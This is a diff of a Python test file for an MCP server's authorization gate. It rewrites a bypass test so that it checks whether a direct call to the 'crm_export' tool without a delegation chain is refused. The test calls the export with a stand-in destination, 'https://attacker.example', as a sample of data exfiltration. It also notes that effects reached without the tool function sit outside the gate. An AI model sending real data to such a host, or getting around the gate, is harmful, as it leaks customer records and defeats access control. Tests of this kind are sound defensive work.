@@ -90,17 +90,25 @@ def test_bypass_guard_absent_refuses_to_serve():
         sv.require_guard(sv.build_server(None, []))
 
 
-def test_bypass_direct_python_call_is_outside_the_boundary():
-    """Documented, not prevented: the check is at the MCP boundary, not around the Python function."""
+def test_direct_python_call_still_hits_the_gate():
+    """The gate is the first statement INSIDE each tool function, so calling that
+    function directly is checked too. This pins that, and pins what is genuinely
+    outside: any route to the resource that does not go through the tool function."""
     sink: list = []
     server = sv.build_server(sv.ChainVerifier(_signer()), sink)
     fn = server._tool_manager.get_tool("crm_export").fn if hasattr(server, "_tool_manager") else None
     if fn is None:
         pytest.skip("FastMCP internals differ; boundary documented in README")
-    class _Ctx:  # a fake context carrying a valid exporter chain would also work; here we bypass the gate entirely
+
+    class _Ctx:
         class request_context:
-            meta = None
-    # bypass: call the effect directly, as any Python code with the sink could
+            meta = None  # no delegation chain at all
+
+    out = fn(destination="https://attacker.example", ctx=_Ctx())
+    assert out.get("error") == "no_delegation_chain", out
+    assert sink == [], "the tool body must not have run"
+
+    # What IS outside the boundary: reaching the same effect without the tool function.
     sink.append(("crm_export", "direct"))
     assert sink == [("crm_export", "direct")]
 
